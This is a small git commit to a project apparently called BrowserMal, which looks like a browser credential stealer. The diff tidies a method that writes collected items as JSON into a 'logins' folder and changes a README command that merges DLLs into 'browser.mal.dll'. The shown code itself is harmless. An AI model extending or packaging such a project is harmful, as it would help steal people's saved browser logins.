52a86b2079e57eac62d51fc5111d8bee92d98353
miltinhoc <miltinhoc@users.noreply.github.com>
2022-08-20 13:19:37 +0000

    changed readme

--- BrowserMal/Filesaver/FileManager.cs
+++ BrowserMal/Filesaver/FileManager.cs
@@ -8,12 +8,7 @@ namespace BrowserMal.Filesaver
     {
         public static void Save<T>(List<T> list, string outputPath)
         {
-            //StringBuilder stringBuilder = new StringBuilder();
             string json = JsonConvert.SerializeObject(list, Formatting.Indented);
-
-            /*foreach (T item in list)
-                stringBuilder.AppendLine(item.ToString());*/
-
             System.IO.File.WriteAllText(@"logins\" + outputPath, json);
         }
     }
--- README.md
+++ README.md
@@ -3,5 +3,5 @@
 To merge all the dll's into one:
 
 ```
-ILMerge.exe /out:browser.mal.dll BrowserMal.dll BouncyCastle.Crypto.dll EntityFramework.dll EntityFramework.SqlServer.dll Newtonsoft.Json.dll SqliteReader.dll
+ILMerge.exe /out:browser.mal.dll BrowserMal.dll BouncyCastle.Crypto.dll EntityFramework.dll EntityFramework.SqlServer.dll Newtonsoft.Json.dll 
 ```
